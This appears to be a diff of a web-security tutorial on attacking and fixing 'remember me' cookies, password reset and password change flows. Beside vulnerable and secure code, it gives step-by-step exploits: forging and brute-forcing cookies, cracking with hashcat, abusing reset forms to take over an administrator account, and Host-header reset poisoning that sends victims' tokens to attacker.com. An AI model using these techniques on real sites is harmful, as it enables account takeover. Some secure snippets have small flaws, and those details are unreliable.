@@ -1,173 +1,637 @@
 # Vulnerabilities in other authentication mechanisms
 
-Beyond the primary login flow, “account management” features (remember-me, password reset, password change) regularly introduce high-impact vulnerabilities because they can bypass or replace normal authentication checks.  
-Treat these endpoints as part of your authentication system and secure them to the same standard as the login page.
+While primary login pages receive security scrutiny, supplementary authentication features like "remember me" cookies, password reset, and password change often contain critical vulnerabilities. Attackers who can create accounts can study these mechanisms extensively, discovering predictable patterns, logic flaws, and bypasses that grant access without knowing passwords.
 
-## Keeping users logged in (“Remember me”)
-“Remember me” usually works by issuing a long-lived token stored in a persistent cookie; possession of this cookie can effectively bypass interactive login.  
-The most common failures happen when tokens are predictable, derived from static values (username/timestamp), or (worst-case) include password material.
+These supplementary features are high-value targets because they're designed to bypass normal authentication, making them attractive attack vectors for account takeover.
 
-### Common weaknesses
-- Predictable token construction (e.g., `username + timestamp`) enabling guessing/brute force.
-- “Encoding” mistaken for encryption (Base64 provides no confidentiality).
-- Reversible encryption used incorrectly (weak keys, shared secrets, poor key management).
-- Hashing static values without a unique per-token salt, making offline guessing feasible if the algorithm is known.
-- No rate limiting on token verification, allowing attackers to bypass login attempt limits by guessing tokens instead.
-- Tokens not rotated or invalidated, enabling replay for long periods after compromise.
+> Only test systems you own or are explicitly authorized to assess.
 
-### Secure design pattern (recommended)
-Use a **random, high-entropy** token and store only a server-side representation (preferably a hash), with rotation and revocation.
+## "Remember me" / "Stay logged in" vulnerabilities
 
-Selector + validator pattern (conceptual):
-- Cookie stores: `selector.validator` (both random)
-- DB stores: `selector`, `hash(validator)`, `user_id`, `expires_at`, `last_used`, `revoked`
+### The feature: Persistent authentication cookies
 
-Why this helps:
-- Fast lookup by selector, but validator is never stored in plaintext.
-- If DB leaks, attacker still can’t directly replay validators.
-- Easy rotation: issue a new validator after each use.
+When users check "Remember me," websites generate persistent cookies that bypass login for weeks or months. If poorly implemented, these cookies can be predicted, cracked, or forged.
 
-Example (Python-like pseudocode):
+### Vulnerability 1: Predictable cookie generation
+
+#### Weak implementation (MD5 hash of username):
+
 ```python
-import os, hmac, hashlib, base64, time
-
-def b64url(b: bytes) -> str:
-    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
-
-def hash_token(token: str) -> str:
-    # Use a server-side secret "pepper" stored outside the DB if possible
-    pepper = b"SERVER_SECRET_PEPPER"
-    return hmac.new(pepper, token.encode(), hashlib.sha256).hexdigest()
-
-selector  = b64url(os.urandom(9))      # short id for lookup
-validator = b64url(os.urandom(33))     # high entropy secret
-
-cookie_value = f"{selector}.{validator}"
-
-store_in_db(
-  selector=selector,
-  validator_hash=hash_token(validator),
-  user_id=user_id,
-  expires_at=int(time.time()) + 60*60*24*30,  # e.g., 30 days
-  revoked=False
-)
-
-set_cookie(
-  name="remember_me",
-  value=cookie_value,
-  http_only=True,
-  secure=True,
-  same_site="Lax",   # consider "Strict" where UX allows
-  path="/",
-  max_age=60*60*24*30
-)
+# VULNERABLE: Predictable cookie
+def create_remember_me_cookie(username):
+    cookie = hashlib.md5(username.encode()).hexdigest()
+    response.set_cookie('remember-me', cookie, max_age=2592000)  # 30 days
+    return cookie
 ```
 
-Rotation on use (conceptual):
-- If remember-me cookie is presented and valid, **rotate** validator (and optionally selector) and set a new cookie.
-- If invalid, revoke that selector record and force full login.
-
-Revocation events to implement:
-- User logs out (“log out of all devices” option is ideal).
-- Password change, MFA enrollment changes, email change.
-- Suspicious activity detection.
-
-## Resetting user passwords (high-risk by design)
-Password reset is inherently dangerous because it replaces normal password authentication with an alternative proof mechanism.  
-The safest implementations never send a user their current password and never email a persistent password.
-
-### Unsafe patterns to avoid
-- Sending the existing password (should be impossible with secure storage).
-- Emailing a newly generated long-lived password.
-- Reset links that identify the account directly (e.g., `reset?user=victim`) without a secret, unguessable token.
-- Tokens that don’t expire, are reusable, or are not invalidated after use.
-- Failing to validate the token again on final form submission (only validating on page load).
-
-### Robust reset flow (recommended)
-1. User submits identifier (email/username).
-2. Application always responds generically (don’t reveal whether the account exists).
-3. If account exists: generate a high-entropy, single-use reset token, store only a hash server-side, set short expiry.
-4. Send reset link containing the token (HTTPS only).
-5. On link open: validate token (exists, not expired, not used).
-6. On form submit: **re-validate token** and reset the password; immediately invalidate token(s).
-7. Notify the user via out-of-band channel that a reset occurred.
-
-Token generation example (Node.js):
-```js
-import crypto from "crypto";
-
-function newResetToken() {
-  const token = crypto.randomBytes(32).toString("base64url"); // high entropy
-  const tokenHash = crypto.createHash("sha256").update(token).digest("hex");
-  return { token, tokenHash };
-}
-
-// DB: store tokenHash, userId, expiresAt, usedAt=null
-// Email link: https://app.example/reset-password?token=<token>
-```
-
-Reset form submission (server-side checks you should enforce):
-- Token exists and matches stored hash.
-- Not expired.
-- Not previously used.
-- Password meets policy.
-- Reset action is rate limited.
-- CSRF protections for the reset POST (don’t rely on the token alone as the only anti-CSRF control).
-
-### Password reset poisoning (defensive notes)
-If your app builds reset URLs dynamically using request headers (especially `Host` / forwarding headers), it may be possible for an attacker to influence where the reset link points.  
-Hardening measures:
-- Build absolute URLs from a configured canonical origin, not from inbound headers.
-- Validate/allow-list `Host` and proxy forwarding headers at the edge.
-- Prefer generating links using server-side configuration (e.g., `APP_BASE_URL`) and known routes.
-
-## Changing user passwords
-Password change endpoints often reuse the same credential verification logic as login, and can be vulnerable to the same classes of issues (brute force, enumeration, logic flaws).  
-They become especially dangerous when the endpoint lets the requester choose the target username (even via a hidden field).
-
-### Common weaknesses
-- Target user is taken from request data (hidden input/cookie/param) rather than the authenticated session.
-- Current password not required (or not re-verified) before changing to a new password.
-- Missing step-up authentication for sensitive changes.
-- No CSRF protection (attacker forces a logged-in victim to submit a password change).
-- Weak rate limiting on “current password” attempts (enabling password guessing through the change-password endpoint).
-
-### Secure design pattern (recommended)
-- Identify the account to change using the server-side session principal only.
-- Require current password (and consider step-up MFA) before allowing the change.
-- Apply CSRF protection and rate limiting.
-- Invalidate active sessions and remember-me tokens after password change (or at least rotate them).
-- Notify the user of the change.
-
-Example (conceptual server logic):
+Cookie for user "carlos":
 ```text
-POST /account/change-password
-
-Require: user is authenticated
-Require: CSRF token valid
-target_user = session.user_id   # not from request
-Verify: current_password matches target_user
-Validate: new_password policy
-Update: password hash
-Revoke: all reset tokens, remember-me tokens, and (optionally) sessions for target_user
-Audit log + user notification
+remember-me=d0970714757783e6cf17b26fb8e2298f
 ```
 
-## Testing checklist (quick audit)
-- Remember-me:
-  - Is the token random and high entropy (not derived from username/timestamp/password)?
-  - Is it stored server-side and revocable/rotatable?
-  - Are cookies `HttpOnly`, `Secure`, and `SameSite`?
-  - Is there rate limiting on token verification?
+**Exploitation:**
+```python
+import hashlib
 
-- Password reset:
-  - Do responses avoid account enumeration?
-  - Are tokens single-use, short-lived, and validated on both GET (view) and POST (submit)?
-  - Are links generated from a canonical configured origin (not request headers)?
-  - Are resets logged and user-notified?
+# Attacker creates account, observes their cookie
+attacker_username = "attacker"
+attacker_cookie = "8e01e0020f958462ee47d96dd87c91d7"
 
-- Password change:
-  - Is the target account determined from session, not request parameters?
-  - Is current password (and/or step-up MFA) required?
-  - Are CSRF and rate limiting enforced?
-  - Are sessions/remember-me tokens rotated or revoked?
+# Verify pattern
+if hashlib.md5(attacker_username.encode()).hexdigest() == attacker_cookie:
+    print("[+] Cookie is MD5 of username!")
+    
+    # Generate cookie for victim
+    victim_username = "carlos"
+    victim_cookie = hashlib.md5(victim_username.encode()).hexdigest()
+    print(f"[+] Victim's cookie: {victim_cookie}")
+    
+    # Use to hijack account
+    requests.get("https://target.com/my-account", 
+                 cookies={'remember-me': victim_cookie})
+```
+
+#### Weak implementation (Base64 encoded username:password):
+
+```python
+# VULNERABLE: Reversible encoding
+def create_remember_me_cookie(username, password):
+    cookie_value = f"{username}:{password}"
+    cookie = base64.b64encode(cookie_value.encode()).decode()
+    response.set_cookie('remember-me', cookie, max_age=2592000)
+    return cookie
+```
+
+Cookie example:
+```text
+remember-me=Y2FybG9zOnBhc3N3b3JkMTIz
+```
+
+**Exploitation:**
+```python
+import base64
+
+# Decode cookie
+cookie = "Y2FybG9zOnBhc3N3b3JkMTIz"
+decoded = base64.b64decode(cookie).decode()
+print(f"[+] Decoded: {decoded}")  # carlos:password123
+
+# Password revealed in plaintext!
+```
+
+#### Weak implementation (MD5 of username:password):
+
+```python
+# VULNERABLE: Hash without salt
+def create_remember_me_cookie(username, password):
+    cookie = hashlib.md5(f"{username}:{password}".encode()).hexdigest()
+    response.set_cookie('remember-me', cookie, max_age=2592000)
+    return cookie
+```
+
+Cookie for "carlos:password123":
+```text
+remember-me=3c744d4b49f2a3e6b98f2d84f4d8e19e
+```
+
+**Exploitation:**
+```bash
+# Brute-force with hashcat or john
+echo "3c744d4b49f2a3e6b98f2d84f4d8e19e" > hash.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Or online rainbow tables
+# Google: "3c744d4b49f2a3e6b98f2d84f4d8e19e"
+# Result: carlos:password123
+```
+
+### Exploitation workflow (brute-forcing stay-logged-in cookies):
+
+**Step 1:** Create account and analyze your cookie:
+```http
+POST /login HTTP/1.1
+Host: vulnerable.com
+
+username=attacker&password=test123&stay-logged-in=on
+```
+
+Response:
+```http
+Set-Cookie: stay-logged-in=YXR0YWNrZXI6dGVzdDEyMw==
+```
+
+**Step 2:** Decode/analyze pattern:
+```python
+import base64
+cookie = "YXR0YWNrZXI6dGVzdDEyMw=="
+decoded = base64.b64decode(cookie).decode()
+print(decoded)  # attacker:test123
+```
+
+Pattern identified: `base64(username:password)`
+
+**Step 3:** Generate cookies for target user with common passwords:
+```python
+import base64
+
+def generate_cookie(username, password):
+    return base64.b64encode(f"{username}:{password}".encode()).decode()
+
+target = "carlos"
+with open('passwords.txt') as f:
+    for password in f:
+        password = password.strip()
+        cookie = generate_cookie(target, password)
+        print(cookie)
+```
+
+**Step 4:** Brute-force with Burp Intruder:
+```http
+GET /my-account HTTP/1.1
+Host: vulnerable.com
+Cookie: stay-logged-in=§payload§
+```
+
+Payload list: Pre-generated cookies for carlos with common passwords.
+
+**Step 5:** Successful cookie grants access without login page rate limiting.
+
+### Secure "remember me" implementation:
+
+```python
+import secrets
+import hashlib
+from datetime import datetime, timedelta
+
+def create_secure_remember_me_token(user_id):
+    # Generate cryptographically secure random token
+    token = secrets.token_urlsafe(32)
+    
+    # Hash token for storage (never store plaintext)
+    token_hash = hashlib.sha256(token.encode()).hexdigest()
+    
+    # Store in database with expiration
+    db.insert_remember_me_token(
+        user_id=user_id,
+        token_hash=token_hash,
+        created_at=datetime.now(),
+        expires_at=datetime.now() + timedelta(days=30),
+        device_fingerprint=get_device_fingerprint(),
+        ip_address=request.remote_addr
+    )
+    
+    # Set cookie (send unhashed token to client)
+    response.set_cookie(
+        'remember-me',
+        token,
+        max_age=2592000,  # 30 days
+        httponly=True,
+        secure=True,
+        samesite='Strict'
+    )
+    
+    return token
+
+def verify_remember_me_token(token):
+    if not token:
+        return None
+    
+    # Hash provided token
+    token_hash = hashlib.sha256(token.encode()).hexdigest()
+    
+    # Look up in database
+    record = db.get_remember_me_token(token_hash)
+    
+    if not record:
+        return None
+    
+    # Check expiration
+    if record.expires_at < datetime.now():
+        db.delete_token(token_hash)
+        return None
+    
+    # Check if device/IP match (optional additional security)
+    if record.device_fingerprint != get_device_fingerprint():
+        alert_security("Possible token theft", record.user_id)
+        db.delete_token(token_hash)
+        return None
+    
+    # Valid token - return user
+    return db.get_user(record.user_id)
+```
+
+**Key principles:**
+- Tokens are cryptographically random (unguessable)
+- Tokens stored hashed (can't be stolen from database)
+- Tokens expire (time-limited risk)
+- One token per device (limits scope of compromise)
+- Device fingerprinting (detects token theft)
+- Secure cookie attributes (HttpOnly, Secure, SameSite)
+
+## Password reset vulnerabilities
+
+### Vulnerability 1: Password reset via email (persistent passwords)
+
+**Bad practice:**
+```python
+# VULNERABLE: Sending passwords via email
+def reset_password(email):
+    user = db.get_user_by_email(email)
+    new_password = generate_random_password()
+    
+    user.password = hash_password(new_password)
+    db.save(user)
+    
+    send_email(email, f"Your new password is: {new_password}")
+```
+
+**Problems:**
+- Password sent over insecure channel (email)
+- Email stored indefinitely in inbox
+- Email synced across devices (phone, laptop, etc.)
+- Email accessible to anyone with email credentials
+- No expiration on new password
+
+### Vulnerability 2: Weak password reset tokens (predictable/guessable)
+
+#### Predictable token (username-based):
+
+```python
+# VULNERABLE: Token derived from username
+def request_password_reset(email):
+    user = db.get_user_by_email(email)
+    token = hashlib.md5(user.username.encode()).hexdigest()
+    
+    reset_url = f"https://site.com/reset?token={token}"
+    send_email(email, reset_url)
+```
+
+**Exploitation:**
+```python
+import hashlib
+
+# Generate reset token for any user
+victim_username = "administrator"
+token = hashlib.md5(victim_username.encode()).hexdigest()
+reset_url = f"https://site.com/reset?token={token}"
+
+# Visit URL to reset admin password
+```
+
+#### Weak token (sequential or timestamp-based):
+
+```python
+# VULNERABLE: Predictable sequential tokens
+reset_token_counter = 1000
+
+def request_password_reset(email):
+    global reset_token_counter
+    token = str(reset_token_counter)
+    reset_token_counter += 1
+    # ...
+```
+
+**Exploitation:** Brute-force tokens 1000, 1001, 1002... until valid.
+
+### Vulnerability 3: User parameter in reset form (broken logic)
+
+#### Vulnerable flow:
+
+**Step 1:** Request reset for victim:
+```http
+POST /forgot-password HTTP/1.1
+
+email=victim@example.com
+```
+
+**Step 2:** Attacker receives NO email (not their account), but can guess reset URL:
+```http
+GET /reset-password?token=abc123xyz HTTP/1.1
+```
+
+**Step 3:** Reset form submitted:
+```http
+POST /reset-password HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+token=abc123xyz&username=victim&new-password=hacked123&confirm-password=hacked123
+```
+
+**Vulnerable backend:**
+```python
+# VULNERABLE: Doesn't verify token belongs to username
+def reset_password():
+    token = request.form['token']
+    username = request.form['username']  # Trusted from form!
+    new_password = request.form['new-password']
+    
+    # Only checks if token exists, not which user it belongs to
+    if db.token_exists(token):
+        user = db.get_user(username)  # Uses attacker-supplied username
+        user.password = hash_password(new_password)
+        db.save(user)
+        return "Password reset successful"
+```
+
+**Exploitation:**
+```http
+# Step 1: Request reset for your OWN account
+POST /forgot-password HTTP/1.1
+email=attacker@example.com
+
+# Step 2: Check your email, get valid token
+# Token: abc123xyz
+
+# Step 3: Visit reset page with YOUR token
+GET /reset-password?token=abc123xyz HTTP/1.1
+
+# Step 4: Submit form with VICTIM's username
+POST /reset-password HTTP/1.1
+
+token=abc123xyz&username=administrator&new-password=pwned123
+```
+
+Result: Admin password changed using attacker's token!
+
+### Vulnerability 4: Token not validated on submission
+
+```python
+# VULNERABLE: Token only checked on GET, not POST
+@app.route('/reset-password', methods=['GET'])
+def show_reset_form():
+    token = request.args.get('token')
+    if db.valid_token(token):
+        return render_template('reset.html', token=token)
+    return error("Invalid token")
+
+@app.route('/reset-password', methods=['POST'])
+def reset_password():
+    # BUG: Doesn't verify token again!
+    username = request.form['username']
+    new_password = request.form['new-password']
+    
+    user = db.get_user(username)
+    user.password = hash_password(new_password)
+    db.save(user)
+```
+
+**Exploitation:**
+```http
+# Request reset for your account to get valid token
+POST /forgot-password HTTP/1.1
+email=attacker@example.com
+
+# Visit reset page with your token (passes GET check)
+GET /reset-password?token=valid_attacker_token HTTP/1.1
+
+# Submit form WITHOUT token, or with deleted token, changing username
+POST /reset-password HTTP/1.1
+
+username=victim&new-password=hacked&token=
+```
+
+### Vulnerability 5: Password reset poisoning
+
+**Concept:** Manipulate Host header to receive victim's reset token.
+
+Vulnerable code:
+```python
+def request_password_reset(email):
+    user = db.get_user_by_email(email)
+    token = generate_secure_token()
+    
+    # BUG: Uses Host header to build URL
+    host = request.headers.get('Host')
+    reset_url = f"https://{host}/reset?token={token}"
+    
+    send_email(user.email, f"Reset your password: {reset_url}")
+```
+
+**Exploitation:**
+```http
+POST /forgot-password HTTP/1.1
+Host: attacker.com
+Content-Type: application/x-www-form-urlencoded
+
+email=victim@example.com
+```
+
+Victim receives email:
+```text
+Reset your password: https://attacker.com/reset?token=victim_secret_token
+```
+
+Victim clicks link → attacker receives token in server logs.
+
+**Alternative with X-Forwarded-Host:**
+```http
+POST /forgot-password HTTP/1.1
+Host: vulnerable.com
+X-Forwarded-Host: attacker.com
+
+email=victim@example.com
+```
+
+### Secure password reset implementation:
+
+```python
+import secrets
+from datetime import datetime, timedelta
+
+def request_password_reset(email):
+    user = db.get_user_by_email(email)
+    
+    # ALWAYS return same message (prevent enumeration)
+    message = "If account exists, password reset email sent"
+    
+    if user:
+        # Generate cryptographically secure token
+        token = secrets.token_urlsafe(32)
+        
+        # Store hashed token with metadata
+        db.store_reset_token(
+            user_id=user.id,
+            token_hash=hashlib.sha256(token.encode()).hexdigest(),
+            created_at=datetime.now(),
+            expires_at=datetime.now() + timedelta(hours=1),
+            used=False
+        )
+        
+        # Invalidate previous tokens
+        db.invalidate_old_tokens(user.id)
+        
+        # Build URL from trusted config, NOT headers
+        reset_url = f"{settings.BASE_URL}/reset?token={token}"
+        
+        send_email(user.email, f"Reset link (expires in 1 hour): {reset_url}")
+        
+        # Log event
+        log_security_event('password_reset_requested', user.id, request.remote_addr)
+    
+    return message
+
+def reset_password():
+    token = request.form['token']
+    new_password = request.form['new-password']
+    
+    # Hash token for lookup
+    token_hash = hashlib.sha256(token.encode()).hexdigest()
+    
+    # Get token record
+    reset_record = db.get_reset_token(token_hash)
+    
+    if not reset_record:
+        return error("Invalid or expired reset link")
+    
+    # Verify token hasn't expired
+    if reset_record.expires_at < datetime.now():
+        db.delete_token(token_hash)
+        return error("Reset link has expired")
+    
+    # Verify token hasn't been used
+    if reset_record.used:
+        return error("Reset link already used")
+    
+    # Validate new password
+    if not is_strong_password(new_password):
+        return error("Password too weak")
+    
+    # Get user FROM TOKEN (not from form!)
+    user = db.get_user(reset_record.user_id)
+    
+    # Reset password
+    user.password = hash_password(new_password)
+    db.save(user)
+    
+    # Mark token as used
+    reset_record.used = True
+    db.save(reset_record)
+    
+    # Invalidate all sessions
+    invalidate_all_sessions(user.id)
+    
+    # Log event
+    log_security_event('password_reset_completed', user.id)
+    
+    # Notify user
+    send_email(user.email, "Your password was changed")
+    
+    return success("Password reset successful")
+```
+
+## Password change vulnerabilities
+
+### Vulnerability 1: No current password verification
+
+```python
+# VULNERABLE: Allows password change without current password
+@app.route('/change-password', methods=['POST'])
+def change_password():
+    user_id = session['user_id']
+    new_password = request.form['new_password']
+    
+    # BUG: Doesn't verify current password
+    user = db.get_user(user_id)
+    user.password = hash_password(new_password)
+    db.save(user)
+    
+    return "Password changed"
+```
+
+**Exploitation:** If attacker gains temporary session access (XSS, CSRF, open browser), they can permanently change password.
+
+### Vulnerability 2: Username in hidden field
+
+```python
+# VULNERABLE: Username in client-controlled field
+@app.route('/change-password', methods=['POST'])
+def change_password():
+    username = request.form['username']  # From hidden field!
+    current_password = request.form['current_password']
+    new_password = request.form['new_password']
+    
+    user = db.get_user(username)
+    if verify_password(user, current_password):
+        user.password = hash_password(new_password)
+        db.save(user)
+```
+
+**Exploitation:**
+```http
+POST /change-password HTTP/1.1
+
+username=administrator&current_password=guess123&new_password=hacked
+```
+
+Can enumerate users and brute-force passwords via password change, not login!
+
+### Vulnerability 3: Username enumeration via different responses
+
+```python
+# VULNERABLE: Different responses leak info
+@app.route('/change-password', methods=['POST'])
+def change_password():
+    username = request.form['username']
+    current_password = request.form['current_password']
+    new_password = request.form['new_password']
+    
+    user = db.get_user(username)
+    
+    if not user:
+        return "User not found"  # Leaks existence
+    
+    if not verify_password(user, current_password):
+        return "Current password incorrect"  # Confirms user exists
+    
+    user.password = hash_password(new_password)
+    return "Password changed"
+```
+
+**Exploitation:** Enumerate valid usernames, then brute-force via password change.
+
+### Secure password change implementation:
+
+```python
+@app.route('/change-password', methods=['POST'])
+def change_password():
+    # Get user from authenticated session (not form)
+    if not session.get('user_id'):
+        return redirect('/login')
+    
+    user = db.get_user(session['user_id'])
+    
+    current_password = request.form['current_password']
+    new_password = request.form['new_password']
+    confirm_password = request.form['confirm_password']
+    
+    # Verify current password
+    if not verify_password(user, current_password):
+        return error("Current password incorrect")
+    
+    # Verify new passwords match
+    if new_password != confirm_password:
+        return error("Passwords don't match")
+    
+    # Validate new password strength
+    if not is_strong_password(new_password):
+        return error("New password too weak")
+    
+    # Prevent password reuse
+    if check_password_history(user, new_password):
+        return error("Cannot reuse recent password")
+    
+    # Change password
+    user.password = hash_password(new_password)
+    db.save(user)
+    
+    # Invalidate all other sessions
+    invalidate_all_sessions_except_current(user.id, session['session_id'])
+    
+    # Log event
+    log_security_event('password_changed', user.id)
+    
+    # Notify user via email
+    send_email(user.email, "Your password was changed")
+    
+    return success("Password changed successfully")
+```
